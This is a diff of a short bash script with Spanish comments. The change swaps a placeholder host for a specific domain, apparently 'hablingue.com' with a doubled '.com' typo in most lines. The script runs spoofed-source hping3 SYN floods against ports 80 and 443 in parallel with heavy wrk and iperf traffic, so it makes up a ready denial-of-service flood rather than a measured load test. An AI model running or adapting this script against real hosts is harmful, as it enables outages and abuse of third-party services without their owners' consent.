@@ -18,14 +18,14 @@
 #!/bin/bash
 
 # Iniciar hping3 en segundo plano
-sudo hping3 -S -p 80 --flood --rand-source tu-servidor.com &
-sudo hping3 -S -p 443 --flood --rand-source tu-servidor.com &
+sudo hping3 -S -p 80 --flood --rand-source hablingue.com.com &
+sudo hping3 -S -p 443 --flood --rand-source hablingue.com.com &
 
 # Iniciar wrk en segundo plano
-wrk -t32 -c1000 -d60s http://tu-servidor.com &
+wrk -t32 -c1000 -d60s http://hablingue.com.com &
 
 # Iniciar iperf en segundo plano
-iperf -c tu-servidor.com -t 60 -P 10 &
+iperf -c hablingue.com -t 60 -P 10 &
 
 # Esperar a que todos los procesos terminen
 wait
